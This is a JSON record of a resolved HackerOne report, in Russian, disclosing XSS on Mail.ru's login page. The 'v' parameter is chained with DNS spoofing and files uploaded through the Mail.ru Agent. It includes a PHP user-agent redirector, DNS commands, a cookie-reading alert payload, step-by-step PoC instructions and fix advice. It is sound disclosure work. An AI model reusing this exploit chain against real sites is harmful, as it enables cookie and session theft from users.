{"id":291522,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTE1MjI=","url":"https://hackerone.com/reports/291522","title":"XSS on account.mail.ru/login","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-11-18T16:24:10.588Z","submitted_at":"2017-11-18T16:24:10.588Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"obmi","url":"/obmi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":65,"url":"https://hackerone.com/mailru","handle":"mailru","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Mail.ru","twitter_handle":"mailru","website":"https://corp.mail.ru","about":"Building the Internet since 1998"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-01-26T14:11:48.737Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-12-27T14:11:31.863Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"1. Уязвимость на станице https://account.mail.ru/login и подготовка файлов для атаки\n---------------------\n\nВ процессе исследования заметил, что на странице https://account.mail.ru/login не валидируется значение параметра v. Значение выводится на странице как есть и используется в пути до скрипта (т.е. атакующий может его изменить). \n\nПример:\n\n{F240637}\n\n2. Подмена хостов и загрузка ресурсов с другого домена.\n---------------------\n\nЯ предположил, что атака возможна, если заставить клиента скачивать скрипт с домена files.imgsmail.ru, меняя пусть к нему через уязвимость параметра v (описано выше)\nНа домене files.imgsmail.ru хостятся юзерские файлы, которые отправляются через агент. Единственное условие доступа к ним - совпадение юзерагента, поэтому нужен редиректор, приведенный ниже.\n\nУ атакующего нет возможности подменить домен с которого будет идти загрузка скрипта или контролировать содержимое файлов на img.imgsmail.ru. Если только он не контролирует dns сервер, которым пользуется жертва или вообще точку доступа (такое возможно, например в публичных сетях в кафе или торговом центре). Если dns сервер будет возвращать A запись о том, что img.imgsmail.ru соответствует адресу 178.237.20.77 (настоящий IP адрес для домена files.imgsmail.ru, откуда отдаются файлы, загруженные в agent), то браузер будет пытаться грузить ресурсы оттуда (а вот на files.imgsmail.ru атакер уже может заливать свой контент). \nДля теста я поднял и настроил dnsmasq по адресу 52.34.103.214 и вбил настройки в домашний роутер:\n\n```\nmihailob@kali:~dig  '@52.34.103.214' +short img.imgsmail.ru\n94.100.180.102\n```\n\n```\nmihailob@kali:~$ host img.imgsmail.ru\n\u003cimg.imgsmail.ru has address 94.100.180.102\n```\n\nНебольшое препятствие заключается в том, что сервер files.imgsmail.ru при доступе к файлам агента по прямой ссылке идентифицирует клиента по user-agent строчке. Поэтому атакующему необходимо загрузить файлы с необходимымы юзерагентами и составить табличку для нужных редиректов.\nЯ сделал такой простенький скрипт у себя на сервере:\n\n```\n\u003c?php\n$client_ua = $_SERVER['HTTP_USER_AGENT'];\n\n//var_dump($client_ua);\n$redirect_url = 'https://account.mail.ru/login?v=0.3.13/../../../get/';\n$ua_routes = [\n        //FF Linux\n    'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' =\u003e 'xgLens3gSCg20hivTRagWNJRagV09F1hUtAC3K9CioIhdEw7VhTMdkGKwqR9chXUcSWxg0hVDsrc1XBxfAMPWsZ7Mtigx6UIAKNvO1wguGm9lswX92YxmurFLxsehkKgsbKUWhd6Ds0gMFnvrx4bgpghRlTRag/test.js??',\n    //Win NT 6.1\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0' =\u003e 'ourROgRyY0ku4SBxmNtiAftNtiueG2xIF0E4niIFY8QIhIbSNsOVm37svkC3JIphAJEIaiT0sGnh6tRSGm4R0SdBEljIzlaJs1qhqp5Gqf7XO1rnnHZGOMD5WSuuwJgikJd8dGSM67pSOzv2ks0kPTQScKmNti/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0' =\u003e 'om2NJuByvqNogCHXvaUt3GvaUt8jzMdXpH9uotxgNnECLY1b2iY42SrCo5cJpmzPshamovxhUXZqzTztSdzOGCiG1kgCwriFECVb3g2tKaoeUiDpXzLmezd2mCMd7OhXQj0qDXddq6iChpGYRtkicPECWXvaUt/test.js??',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0' =\u003e 'wFzJqfD5AQJjR1iyVvMGOQ4vMGqrIUxiC1gHvSqrfHAGWB6a0GMrG2HGPEJyC1Cypecsy2RraIqVyJy1RMCogGVAlL61qhB7mSrlrrys701JPsfU91gSA4ckgi563H71Rvl5EG4zFFX1GQjhHSIwZF2IW2VvMG/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0' =\u003e 'ZbDbdu16AYF2010DXyISt0XyIS8SL2IIu0tr5SJ7UdaGi36yIGVG9KsIzpfxfSgpKTQIxpPCK1nqHVrSDiKB6sX7udJGtvrvCGzHFiGiMXQy01KUVdqGAeVAI1zQ04miHe9zmGQGCYT1ejo80I9jr8tGwjXyIS/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0' =\u003e 'vpRuf62pV0FyCGmoE7Xi77a7XiCmcARSNSutsG4eO2nIxKm7fIOrW84InQz1tSLKAuWSdBHP6s876juGylvbbGbAl5f1GNYak1Mjgt7SM1p5aSMANl6SU1XSsIt8DaMIdOFiqIyxIRHSd7XIWSaTodKGoaE7Xi/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' =\u003e 'OQLdZufaBxzcnxFr2znRM2znxHWlfdxeS07oKsAlw7KZOCFuKfqpmPhpcdleKAD4SusbGUK9KnmZsBgADpt9g40VtXsISqZXKkALtGsaisTMhGVd8HxJeXbph7ggAphyBpY9h3sXk4hUcXEbxQ5pXOxE82znx/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0' =\u003e 'OQLdZufaBxzcnxFr2znRM2znxHWlfdxeS07oKsAlw7KZOCFuKfqpmPhpcdleKAD4SusbGUK9KnmZsBgADpt9g40VtXsISqZXKkALtGsaisTMhGVd8HxJeXbph7ggAphyBpY9h3sXk4hUcXEbxQ5pXOxE82znx/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0' =\u003e 'mKXu3WpU65pDSClK0xEX6LQxEXBgQwImV93momlfXCwikA6ZWmTyuy6CTuLopXBuoDaiWqJ8cXEiIMNifkxqAC5v26vmQs6cBC8RFHJCsFfxXtTIGw0ihPyLImUAkW7XENNugtsCcbgmJLrvJmzCSreiIh0xEX/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0' =\u003e 'jUhPoHrrhcc2lXqPoiJCIzoiJCvMWqQCwDCu2X25qzimWNoj0tg3BU5XWQYMDtL3TX3CLlUdaiCPvxltOGtyXtLmqGRta445TC4syJaCa8oENmjNRwdtB1ugEiRLlBOtBafDytPomFNtjbSIUig1vxoi27oiJC/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0' =\u003e 'Pz4beFySYDyPP1RYUXbSHDcXbSWgeaNG853xb1IRUGpSV9Lj31ZGjtjGnqV3KG8gGvxIsFfOkGlEfjSIuAqBWSvebheGriFXGiyTHJgGdrBJpIeI6JvS0czWoS6lW3P1JQjOxIcawsaG1Wv8KigoWd5GCDUXbS/test.js?',\n    //\n    'Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0' =\u003e 'a4rrNIMBcXes0sJCPoQgHRToQg53mk5gR3hkLhII1c4gMIQWjxxttkHKTylx3sOn98yKI2nGgK9e2DZxurDPgxGZFcchE5vNtxCIgeosiTjRfsMlSFah9af5HKsbmfvg6CBrnx45lCVsZuPDvKShMVaxtnPoQg/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:49.0) Gecko/20100101 Firefox/49.0' =\u003e 'SM7AU6KcSv4OoIbTfXlIoJ9XlIIFzvmS4zlFUGxBtfdGyqJDbIvImUjS9oCLJsCyajIGvj0gAGCecXtIV617TIrhBpa1UmvUVG9O8or1vevoIiU4xnZSco5Ss1eSsxsI4ARuPICyDYjILLqGnSUIo1iifJfXlI/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0' =\u003e 'qBcio58DE2Ty5ZKzZduZPKAduZTU8YbWqwjPjnb84lQRVWcybAhUu7pnhH5XaZndQHLnGGRrqAcQInZA8QwH4WNytuqAQ9QB4nq5XijRAVzAiZ0WqU5RagJNOnXuIbaAaZ8zbRVVltpRjcI4wWWIarknezZduZ/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0' =\u003e 'qBcio58DE2Ty5ZKzZduZPKAduZTU8YbWqwjPjnb84lQRVWcybAhUu7pnhH5XaZndQHLnGGRrqAcQInZA8QwH4WNytuqAQ9QB4nq5XijRAVzAiZ0WqU5RagJNOnXuIbaAaZ8zbRVVltpRjcI4wWWIarknezZduZ/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0' =\u003e 'klBBESp2lWvq4KkR8e2gBs0e2gRSxqRsuzYzFKTXCeBx2izlqx1DmuxxlWqmssq1FT6hqc55IKREonIgs6EZHg1CriJKT8ApLx0X1bUgZaSVaKixf9RKG0aA8giwofJxoeC0XhVhtWBgDtqQtsh42PJKr38e2g/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:53.0) Gecko/20100101 Firefox/53.0' =\u003e 'dpDeMJHxyWyFOKxLulIsvxPlIsilnLIg0fpjyxnHR2nhwa7uih9dRLZg3gmgXgFvNpcx2TJqyKTRn8ehTWKmAhADBKsKD99cssN1dCSsJY0KMhlGNX0hRRKkpsMLGCIsAg7ZFhpLa3RgflEFahAqIWAsaBulIs/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0' =\u003e 'RbDCzTqxyZWfIKxLJ8us8B58usUJ4v9xsdGiAxQv6DbgjO3kAh1YCWPKEO8n2xGGogsxVPKvJhWUz91x81qLExT2mT6hDLPEgKcYz8KhKwWsGhl06zIh5Gs3rs5vPzZxLdBPoKE0Heag7An8AsYQOsLKv2J8us/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:55.0) Gecko/20100101 Firefox/55.0' =\u003e 'kEOixDxyes0DHxLBBlAKx3LlAKNrNcrKeyJDdxJN7Xrg6snWsKqiMI3KgJz6Bxau1LjsnbaaHxO2pQjgfuNhjx4MrVXsowA7whUhLIwKGMWkjxnz6YIKns97Wh12BnMxbgVaphPxiMdsZ6t97KVpaGzgQkBlAK/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:56.0) Gecko/20100101 Firefox/56.0' =\u003e 'OlNqOVzneOQjNXur6pDCWiUpDCnE4uYX7qIOPioH923ChlQzwiXkfmpmhKTOrmTesUwCf9i8yXLREVRmciRc0iKsQBktwmTfgmTXkJWmCtUXqmYOwlsXC09GjCC0AoLX0zupzir3ns0tZP7VNC8xDLsXW86pDC/test.js?',\n    'Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0' =\u003e 'mHkTlJNUd65apnQxf1PWM7Y1PWnRAFyWxpPSwZFcg3GRN9EMDWBdAhaZZQrEQnSaBuCRqEBBARNHzNyZHKQKGA1Guo0n9ZMYGWWW6a2ZmgQdRRm7va9nVkmEsABj2FaZoXv3rZoOHLqAAVX1JWlJcD9Wqy91PW/test.js?',\n    //Win NT.10\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0' =\u003e 'YuXAP8AuGn7HFgyjjItsHsbItsgrGpSg9q42KxpdeNXKShwfoxhgUyCgMlEeHghTqrhx15zvixqb2j9K8lalnsknzbWsdIXqpxE3lsQs1zVRzxS0uTzx0hjZSxxhZa0KOloWss4UQsMhO6d7HhlFPPBKcDjIts/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0' =\u003e 'YxXfyOWmUU2w2nvkZHQWIenHQWyzdtbn1rqp0AIn13aZ0gKJWWNVWI6AKqG6RZzccBanM2IMEn3EgRcZuIBV6AB7X5dAuzHveZMhj1YZrWxQtRZh78jZhn5L1niXX8uAAklusn7Av4gAM1aQIZu73OwZZHZHQW/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0' =\u003e 'bYBZTCrdm8jZ9mlxvzjiyLlzjiALh3hX2QSGxmLcoJ3XrqhhTC7Kd4NXd6aMDCW78HzC77kCFtr5KCVXRRnRMtbkcPCtaiV8XXi6MnHC53VPEik7clECewpF3C2XHXWtvXT3EtPK90RtzN4FUi8YbAfm3ybzji/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0' =\u003e 'QOBjrepKtgoa5gg0kH6rokH6xyIuiugzk7T6Kokm1vsp3hCJh3Mvs5hO41oTg6PtjDgKEeTNhFzbO8Kf4fLmgzJ4c3Ktulb3s8hZR6KMrYCoxvs9mxx4VgA2gOjFZihVO8kNxCdyMgK90tRKhvVKl9sE4kH6x/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0' =\u003e 'crUcnsXPdDZgbIGEwrlSzqPrlSXmTtCGM6OTTsft9AD1KUKNCGqlScKGGvjTUsPliaJ18qQx6sPTJA21I3qEbIrulcUGiFNbBsILbB0G3aRhnGOjSze1QZFsU1OnUqSIuua8oGXMh4RIrYbkDSG34V1inawrlS/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0' =\u003e 'wCdB7I5zX5NNCtpyW5bXXZZ5bXVCSqltWhOS3XQ4iFItagpystwjZmFCJs40JCmGXJitGT02YXoMJF9tlYxz9Crk5RaCq9ZHECvcauHiaUymNC4fINLi9LiASXJWFGZXua6IstlkEwNtt39pTt70YVUmd2W5bX/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0' =\u003e 'oTBkcbOHuUcYsWqqDsdWCPYsdW5PhHPAYOV3QZz5k1jZJjnwLAezYKpR8NEiAnYaegunHlqqbnUWgVUnZVt4NWKDFVQWfPwwUn5Dc9kZ6YaiQnSbR8rZSI6kgnkFg35nSMDzFWOAjZ7nb9zyYRFAwy3AlEDsdW/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0' =\u003e 'fy9ixvQKJIH4lKg9BZGhb7kZGhrSpIBhljfuPx0zOJoKQZZZDhFHBZ3sRY3hkxGvrBdxR8lsvsSP7JNhwWDL3g5fnSSsJjwtdhyrtArxwuUOmKpFN0WgUPsywgmhUIqh2k1qeh5BU1dgexFXnxTnr0HxERBZGh/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0' =\u003e 'aaSPTTusNXXrUgXx088gFF888guu4vBhi4RD8sz3ojNgDG4zQhf2bNpglMlBChpaXbuKb6issggYXSBKWfNo8KTXFckhpTqLtgnjQT4stW5fwKR3IC6g0ruobhSQwEhg19z8es3NN2uxp1VUhxrtmoBhryQ88g/test.js?',\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0' =\u003e 'Oya1mq9p9w2HatCXHuqmqw6uqm7MrGmXyUAngtAHciQX6St13mapMvRtOY8glidLOJbCN4Aw4CEVvy3m3ZEKwiDTE39tnwoZbiy9UzLXQVDLliJPoq8tciHsVXw9nYNt8ndmyX96lUJmlao4gtgk7ymCUXHuqm/test.js?',\n    //\n];\n\nif (!empty( $ua_routes[$client_ua] ) ) {\n        $destination = $redirect_url . $ua_routes[$client_ua];\n        header('Location: ' . $destination);\n}\nelse {\n        header(\"Content-Type: text/plain\");\n        echo 'Unknown user-agent:\u003c'.$client_ua.'\u003e';\n}\n```\n\nЯ заранее понаотправлял файлы через агент своему контакту с вышеприведенными юзерагентами. Содержимое загруженного файла было одинаково во всех случаях:\n\n```\nmihailob@kali:~/tmp cat test.js \nalert('Hello i am attacker script from uploaded file via agent. The script was executed on a domain:' + document.domain + '. The cookie are: ' + document.cookie );\n```\n\n{F240638}\n\n3. Сценарий атаки\n---------------------\n\n1. атакер конфигурирует сеть таким образом, что в качестве dns'а используется подконтрольный ему сервер. По запросу img.imgsmail.ru он будет давать ip 178.237.20.77 (адрес files.imgsmail.ru):\n2. жертва подключается к такой сети\n3. жертва открывает страницу по ссылке откуда-нибудь (ну или атакер подмешивает ей автоматическое открытие в http трафик, как делают показ рекламы в московском метро или в мобильном интернете) и запускает код атакующего\n\n4. POC:\n---------------------\n\nСтабильно воспроизводится в последнем Firefox, но не работает в Google chrome (в данном примере не работает потому что хрому нужен явный content-type для js). Думаю, что Firefox'а достаточно для пруфа.\n\n1. Выставить в настройках сети dns сервер: 52.34.103.214. \n2. Открыть ссылку-редиректор: https://obmhld.com/pocs/?token=b0c93dc547233c441e2316d87ff067c2\n\nЕсли вашего юзерагента не оказалось в моем списке - вы можете сами выставить на клиенте нужный юзерагент, который уже есть в редиректоре, чтобы убедиться в работоспособности сценария. Список приведен выше в исходниках редиректора.\nЕсли по каким-то причинам вы не можете использовать существующий - напишите мне, пожалуйста, - я добавлю ваш user-agent в список.\n\nЗаписал видео, как это выглядит у жертвы (браузер под виртуалкой - firefox 57 под win7, без дополнений и расширений, никаких манипуляций с сертификатами не проводил )\n\n{F240639}\n\n5. Как починить:\n---------------------\n\nКак быстрофикс - можно провалидировать хосты на машинах в конфиге nginx'а, чтобы не было возможности обращаться к серверу 178.237.20.77 с заголовком Host: img.imgsmail.ru.\nТакже нужно добавить более жесткую валидацию параметра v на странице https://account.mail.ru/login?\n\nP.S. Я уверен что в реальности сценарий может быть еще проще, если атакующий контролирует всю сеть. Он может, к примеру, заменить ответ на любой http запрос с целью редиректа пользователя с нужным параметром автоматически, такое можно наблюдать в московской подземке, где подмешивается реклама в контент http страниц или у мобильных операторов, мтс (по крайней мере в Москве) подсовывает свою рекламу в http ответы.\n\nP.S.p.s. Если что-то описал не совсем понятно - дайте мне знать, буду рад помочь.","vulnerability_information_html":"\u003ch2 id=\"1-https-account-mail-ru-login\"\u003e1. Уязвимость на станице \u003ca title=\"https://account.mail.ru/login\" href=\"/redirect?url=https%3A%2F%2Faccount.mail.ru%2Flogin\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://account.mail.ru/login\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e и подготовка файлов для атаки\u003c/h2\u003e\n\n\u003cp\u003eВ процессе исследования заметил, что на странице \u003ca title=\"https://account.mail.ru/login\" href=\"/redirect?url=https%3A%2F%2Faccount.mail.ru%2Flogin\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://account.mail.ru/login\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e не валидируется значение параметра v. Значение выводится на странице как есть и используется в пути до скрипта (т.е. атакующий может его изменить). \u003c/p\u003e\n\n\u003cp\u003eПример:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"screen_002.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/637/f5c44ed42fc26e34c52ef93e7119a50c7360cb1f/screen_002.png?response-content-disposition=attachment%3B%20filename%3D%22screen_002.png%22%3B%20filename%2A%3DUTF-8%27%27screen_002.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052523Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=3fb2e9f7b3d50de7f1e1900eb383dd19f43fc5ba76ee5d975b4574fadcb13851\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/240/637/f5c44ed42fc26e34c52ef93e7119a50c7360cb1f/screen_002.png?response-content-disposition=attachment%3B%20filename%3D%22screen_002.png%22%3B%20filename%2A%3DUTF-8%27%27screen_002.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052523Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=3fb2e9f7b3d50de7f1e1900eb383dd19f43fc5ba76ee5d975b4574fadcb13851\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"2\"\u003e2. Подмена хостов и загрузка ресурсов с другого домена.\u003c/h2\u003e\n\n\u003cp\u003eЯ предположил, что атака возможна, если заставить клиента скачивать скрипт с домена files.imgsmail.ru, меняя пусть к нему через уязвимость параметра v (описано выше)\u003cbr\u003e\nНа домене files.imgsmail.ru хостятся юзерские файлы, которые отправляются через агент. Единственное условие доступа к ним - совпадение юзерагента, поэтому нужен редиректор, приведенный ниже.\u003c/p\u003e\n\n\u003cp\u003eУ атакующего нет возможности подменить домен с которого будет идти загрузка скрипта или контролировать содержимое файлов на img.imgsmail.ru. Если только он не контролирует dns сервер, которым пользуется жертва или вообще точку доступа (такое возможно, например в публичных сетях в кафе или торговом центре). Если dns сервер будет возвращать A запись о том, что img.imgsmail.ru соответствует адресу 178.237.20.77 (настоящий IP адрес для домена files.imgsmail.ru, откуда отдаются файлы, загруженные в agent), то браузер будет пытаться грузить ресурсы оттуда (а вот на files.imgsmail.ru атакер уже может заливать свой контент). \u003cbr\u003e\nДля теста я поднял и настроил dnsmasq по адресу 52.34.103.214 и вбил настройки в домашний роутер:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003emihailob@kali:~dig  \u0026#39;@52.34.103.214\u0026#39; +short img.imgsmail.ru\n94.100.180.102\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003emihailob@kali:~$ host img.imgsmail.ru\n\u0026lt;img.imgsmail.ru has address 94.100.180.102\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eНебольшое препятствие заключается в том, что сервер files.imgsmail.ru при доступе к файлам агента по прямой ссылке идентифицирует клиента по user-agent строчке. Поэтому атакующему необходимо загрузить файлы с необходимымы юзерагентами и составить табличку для нужных редиректов.\u003cbr\u003e\nЯ сделал такой простенький скрипт у себя на сервере:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$client_ua\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;HTTP_USER_AGENT\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\n\u003cspan 